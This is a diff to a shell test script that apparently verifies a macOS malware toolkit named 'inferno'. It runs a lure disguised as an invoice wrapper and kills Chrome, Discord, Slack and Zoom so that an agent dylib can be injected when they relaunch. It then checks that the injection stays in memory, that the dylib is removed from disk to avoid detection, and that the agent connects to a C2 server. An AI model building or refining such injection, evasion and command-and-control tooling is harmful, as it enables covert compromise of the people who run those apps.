@@ -5,14 +5,20 @@ SERVER_IP="127.0.0.1"
 SERVER_PORT=4242
 BUILD_DIR="$(pwd)/build"
 
-echo "=== Phase 4A — Manual Verification ==="
+echo "=== Phase 4A/Tier 2 — Manual Verification ==="
 echo ""
 
-# 0. Cleanup
+# 0. Cleanup — kill any running instances and injectable apps
 pkill -9 -f inferno_client 2>/dev/null || true
 pkill -9 -f inferno_shim   2>/dev/null || true
 pkill -9 -f inferno_server 2>/dev/null || true
-rm -f /tmp/.inferno_agent.dylib /tmp/invoice_wrapper
+# Kill common injectable targets so Tier 2 can launch them fresh
+pkill -9 -f "Google Chrome" 2>/dev/null || true
+pkill -9 -f "Discord" 2>/dev/null || true
+pkill -9 -f "Slack" 2>/dev/null || true
+pkill -9 -f "Zoom" 2>/dev/null || true
+sleep 1
+rm -f /tmp/.inferno_agent.dylib /tmp/invoice_wrapper /tmp/.inferno_agent_*.dylib
 
 # 1. Build
 echo "--- Step 0: Build ---"
@@ -66,35 +72,47 @@ else
 fi
 
 /tmp/invoice_wrapper $SERVER_IP $SERVER_PORT > /tmp/wrp.log 2>&1 &
-sleep 6
+sleep 8
+
+echo "=== Wrapper log ==="
+cat /tmp/wrp.log
+echo ""
 
 echo "=== Process check ==="
-ps aux | grep -E "inferno" | grep -v grep || echo "(none)"
+ps aux | grep -E "inferno|inferno_shim|\.inferno_agent" | grep -v grep || echo "(none)"
 
-if pgrep -q inferno_shim; then
-    echo "[PASS] inferno_shim running after wrapper injection"
-else
-    echo "[FAIL] inferno_shim not found"
-    exit 1
-fi
-
+# Check for agent binary (must NOT be present — injection is memory-only)
 if pgrep -q inferno_client; then
     echo "[FAIL] inferno_client process found"
     exit 1
 fi
 echo "[PASS] No inferno_client process"
 
-if [ -f /tmp/.inferno_agent.dylib ]; then
+# Check dylib deleted from disk
+if ls /tmp/.inferno_agent_*.dylib 2>/dev/null; then
     echo "[FAIL] dylib still on disk"
     exit 1
 fi
 echo "[PASS] Dylib deleted from disk"
+
+# Log which mode was used
+if grep -q "Tier 2: attempting injection" /tmp/wrp.log 2>/dev/null; then
+    echo "[INFO] Wrapper used Tier 2 (injected into target app)"
+elif grep -q "Launching Tier 1 (shim)" /tmp/wrp.log 2>/dev/null; then
+    echo "[INFO] Wrapper fell back to Tier 1 (shim injection)"
+fi
+
+# Wait for C2 connection — may come via Tier 2 or Tier 1 fallback
+echo "[INFO] Waiting for C2 connection..."
+sleep 4
 
 if grep -q "Agent connected" /tmp/srv.log 2>/dev/null; then
     echo "[PASS] Agent connected to C2 server"
     grep "Agent connected" /tmp/srv.log
 else
     echo "[FAIL] Agent did not connect to server"
+    echo "--- Server log ---"
+    cat /tmp/srv.log
     exit 1
 fi
 
